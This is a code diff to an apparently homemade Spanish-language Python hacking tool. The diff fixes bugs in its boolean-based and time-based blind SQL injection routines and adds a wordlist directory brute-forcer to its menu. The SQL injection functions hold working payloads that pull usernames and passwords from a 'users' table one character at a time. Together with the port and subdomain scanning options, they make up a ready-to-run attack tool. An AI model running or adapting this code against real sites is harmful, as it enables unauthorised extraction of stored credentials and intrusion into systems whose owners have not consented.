@@ -9,6 +9,7 @@ from tqdm import tqdm
 from string import printable
 from time import sleep
 import sys
+from termcolor import colored
 
 # Definición de colores
 class Colores:
@@ -155,6 +156,7 @@ def makeSQLI(main_url, headers):
     p1 = Progress("Fuerza bruta")
     p1.status("Iniciando proceso de fuerza bruta...")
 
+    extracted_info = ""
     for position in tqdm(range(1, 150), desc="Fuerza bruta"):
         for character in range(33, 126):
             sqli_url = f"{main_url}?id=0 or (select(select ascii(substring(select group_concat(username,0x3a,password) from users), {position},1)) from users where id = 1)={character}"
@@ -162,19 +164,20 @@ def makeSQLI(main_url, headers):
             
             try:
                 r = requests.get(sqli_url, headers=headers)
-            except requests.exceptions.RequestException as e:
+            except requests.RequestException as e:
                 print(colored(f"[!] Error en la solicitud: {e}", Colores.RED))
                 sys.exit(1)
             
             if r.status_code == 200:  
                 extracted_info += chr(character)
-                p2.status(colored(extracted_info, Colores.BLUE))
+                p1.status(colored(extracted_info, Colores.BLUE))
                 break
 
 def makeTimeBasedSQLI(main_url, headers):
     p1 = Progress("Fuerza bruta")
     p1.status("Iniciando proceso de fuerza bruta...")
 
+    extracted_info = ""
     for position in tqdm(range(1, 150), desc="Fuerza bruta"):
         for character in range(33, 126):
             sqli_url = f"{main_url}?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), {position},1))={character}, sleep(0.35), 1)"
@@ -184,7 +187,7 @@ def makeTimeBasedSQLI(main_url, headers):
 
             try:
                 r = requests.get(sqli_url, headers=headers)
-            except requests.exceptions.RequestException as e:
+            except requests.RequestException as e:
                 print(colored(f"[!] Error en la solicitud: {e}", Colores.RED))
                 sys.exit(1)
 
@@ -192,7 +195,7 @@ def makeTimeBasedSQLI(main_url, headers):
 
             if time_end - time_start > 0.35:  
                 extracted_info += chr(character)
-                p2.status(colored(extracted_info, Colores.BLUE))
+                p1.status(colored(extracted_info, Colores.BLUE))
                 break
 
 class Progress:
@@ -247,6 +250,22 @@ def escaneo_puertos():
     else:
         print(Colores.ROJO + "❌ No se encontraron subdominios activos para escanear." + Colores.RESET)
 
+def enumerar_directorios(url, wordlist_path, user_agent=None):
+    """Enumera directorios utilizando una lista de palabras (wordlist)."""
+    headers = {'User-Agent': user_agent} if user_agent else {}
+    with open(wordlist_path, 'r') as wordlist:
+        for word in wordlist:
+            word = word.strip()
+            full_url = f"{url}/{word}"
+            try:
+                response = requests.get(full_url, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    print(Colores.AMARILLO + f"✅ Directorio encontrado: {full_url}" + Colores.RESET)
+                elif response.status_code == 404:
+                    print(Colores.VERDE + f"✅ Directorio no encontrado: {full_url}" + Colores.RESET)
+            except requests.RequestException as e:
+                print(Colores.ROJO + f"❌ Error al verificar directorio: {full_url} - {e}" + Colores.RESET)
+
 if __name__ == "__main__":
     imprimir_banner()  # Imprime el banner al inicio
 
@@ -257,7 +276,8 @@ if __name__ == "__main__":
         print(Colores.CYAN + "3. Escaneo de puertos" + Colores.RESET)
         print(Colores.CYAN + "4. Todas las anteriores" + Colores.RESET)
         print(Colores.CYAN + "5. SQL Injection" + Colores.RESET)
-        print(Colores.CYAN + "6. Salir" + Colores.RESET)
+        print(Colores.CYAN + "6. Enumerar directorios" + Colores.RESET)
+        print(Colores.CYAN + "7. Salir" + Colores.RESET)
 
         tarea = input(Colores.AZUL + "Ingrese el número de la opción: " + Colores.RESET)
 
@@ -316,6 +336,11 @@ if __name__ == "__main__":
             sql_injection_menu(main_url, headers)
 
         elif tarea == '6':
+            url = input(Colores.AZUL + "Ingrese la URL base para enumerar directorios: " + Colores.RESET)
+            wordlist_path = input(Colores.AZUL + "Ingrese la ruta de la wordlist: " + Colores.RESET)
+            enumerar_directorios(url, wordlist_path, user_agent)
+
+        elif tarea == '7':
             print(Colores.VERDE + "\n[✓] ¡Hasta luego!" + Colores.RESET)
             break
 
